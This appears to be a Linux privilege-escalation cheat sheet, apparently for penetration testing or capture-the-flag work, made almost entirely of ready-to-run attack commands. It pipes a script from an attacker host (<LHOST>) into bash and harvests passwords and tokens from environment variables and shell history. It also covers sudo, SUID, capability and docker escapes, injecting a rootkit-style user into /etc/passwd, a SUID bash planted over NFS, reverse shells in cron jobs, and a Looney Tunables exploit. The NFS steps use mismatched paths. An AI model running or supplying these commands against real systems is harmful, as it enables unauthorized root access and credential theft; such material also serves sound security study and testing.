```
# STEP 1: Run linpeas immediately
curl http://<LHOST>/linpeas.sh | bash 2>/dev/null | tee /tmp/lp.out
# Look for RED/YELLOW highlights first

# ── Context ──────────────────────────────────────────────────
whoami && id && hostname
uname -a && cat /etc/os-release
env | grep -i "pass\|key\|secret\|token"
cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null

# ── Sudo ─────────────────────────────────────────────────────
sudo -l
# NOPASSWD → check GTFObins immediately!
# Common: sudo find . -exec /bin/bash \; -p
#         sudo python3 -c 'import os; os.system("/bin/bash")'
#         sudo vim → :!/bin/bash

# ── SUID ─────────────────────────────────────────────────────
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
# Each result → GTFObins

# ── Capabilities ─────────────────────────────────────────────
getcap -r / 2>/dev/null
# cap_setuid+ep → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# ── Cron Jobs ────────────────────────────────────────────────
cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.hourly/
# Writable script run as root → append revshell
# Wildcard (tar/rsync) → wildcard injection

# ── Writable /etc/passwd ─────────────────────────────────────
openssl passwd -1 haxpass
echo 'hax:$1$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hax

# ── NFS no_root_squash ───────────────────────────────────────
cat /etc/exports
# If: /share *(rw,no_root_squash) →
# On ATTACKER (as root):
mkdir /mnt/nfs && mount -t nfs <TARGET_IP>:/share /mnt/nfs
cp /bin/bash /mnt/nfs/ && chmod +s /mnt/nfs/bash
# On VICTIM:
/tmp/bash -p    # → ROOT

# ── Docker group ─────────────────────────────────────────────
id | grep docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# ── Internal services ────────────────────────────────────────
ss -tlnp   # local-only → port forward → exploit

# ── glibc / Looney Tunables (CVE-2023-4911) ──────────────────
# Common on newer Ubuntu 22.04/23.x, Debian 12, Fedora — check version:
ldd --version   # glibc 2.34–2.39 vulnerable
# If vulnerable, download exploit-nation's PoC and run:
python3 exploit.py
```